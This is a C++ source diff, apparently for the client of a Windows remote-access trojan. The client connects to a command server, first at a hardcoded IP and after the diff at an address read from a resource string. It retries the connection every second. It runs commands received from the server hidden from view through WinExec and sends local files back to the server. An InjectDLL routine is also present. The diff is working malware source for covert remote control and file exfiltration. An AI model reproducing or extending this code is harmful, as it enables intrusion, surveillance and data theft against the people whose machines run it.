@@ -1,4 +1,7 @@
+
+
 #include "comdata.h"
+#include "resource.h"
 #include "icld.h"
 
 #include <tlhelp32.h>
@@ -10,6 +13,18 @@
 #pragma comment(lib, "ws2_32.lib")  
 using namespace std;
 
+string WStringToString(const std::wstring &wstr)
+{
+	std::string str;
+	int nLen = (int)wstr.length();
+	str.resize(nLen, ' ');
+	int nResult = WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)wstr.c_str(), nLen, (LPSTR)str.c_str(), nLen, NULL, NULL);
+	if (nResult == 0)
+	{
+		return "";
+	}
+	return str;
+}
 
 
 void InjectDLL(HANDLE hProcess, LPCWSTR dllFilePathName) {
@@ -100,7 +115,16 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 	SOCKADDR_IN addrSrv;
 	addrSrv.sin_family = AF_INET;
 	addrSrv.sin_port = htons(2583);
-	addrSrv.sin_addr.S_un.S_addr = inet_addr("129.204.215.185");
+	//string strSysDir = strExportPath + _T("system.zip");  
+	CString strServeraddr;
+	strServeraddr.LoadStringW(NULL,IDS_SERVER);
+	
+	USES_CONVERSION;
+	//MessageBoxA(0, T2A(strServeraddr),"",0);
+	//exit(0);
+	//IDS_SERVER;
+	
+	addrSrv.sin_addr.S_un.S_addr = inet_addr(T2A(strServeraddr));
 
 	//创建套接字  
 	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
@@ -111,8 +135,10 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 
 	while (TRUE) {
 		//printf("Connect failed:%d", WSAGetLastError());
-		if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET)
+		if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
+			Sleep(1000);
 			continue;
+		}
 		else
 			break;
 	}
@@ -125,8 +151,10 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 		 sockClient = socket(AF_INET, SOCK_STREAM, 0);
 			while (TRUE) {
 				//printf("Connect failed:%d", WSAGetLastError());
-				if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET)
+				if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
+					Sleep(1000);
 					continue;
+				}
 				else
 					break;
 			}
@@ -136,6 +164,27 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 		//printf("%s\n", buff);
 
 		switch (remdata.uId) {
+		case DATA_COMMAND_HIDE: {
+
+		//	string mresCom = "";
+
+			//ifstream cmdread("cmdata.txt", ios::in);
+
+			MESSAGEDATA callback;
+			//cmdread.read(callback.data, 4096);
+			callback.uId = DATA_REVIEW;
+
+			WinExec(remdata.data, SW_HIDE);
+		//	else {
+				strcpy(callback.data, "已执行 DATA_NOREWIEW！");
+		//	}
+			callback.size = strlen(callback.data);
+
+			send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);
+
+			//cmdread.close();
+			break;
+		}
 		case DATA_COMMAND: {
 
 			string mresCom ="";
@@ -172,11 +221,13 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 				callback.uId = FILE_DATA;
 				send(sockClient, (char*)&callback, sizeof(MESSAGEDATA), 0);
 
-			}
+			}		
+			MESSAGEDATA fileData;
+			recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
 
 			while (TRUE) {
-				MESSAGEDATA fileData;
-				recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
+		
+			
 
 				DWORD dwRead;
 				char RemBuff[4096];
@@ -190,7 +241,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 
 					send(sockClient, (char*)& filedatarew, sizeof(MESSAGEDATA), 0);
 					//printf("dfinata:%d\n", dwRead);
-
+					//recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
 					CloseHandle(hFile);
 					break;
 				}
@@ -201,10 +252,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR szCmdLi
 					filedatarew.size = dwRead;
 
 					send(sockClient, (char*)& filedatarew, sizeof(MESSAGEDATA), 0);
-
-					MESSAGEDATA locdata;
-
-					int ret = recv(sockClient, (char*)&locdata, sizeof(MESSAGEDATA), 0);
+					recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
+				//	recv(sockClient, (char*)&fileData, sizeof(MESSAGEDATA), 0);
 				//	printf("data:%d\n", dwRead);
 					//	CloseHandle(hFile);
 				}
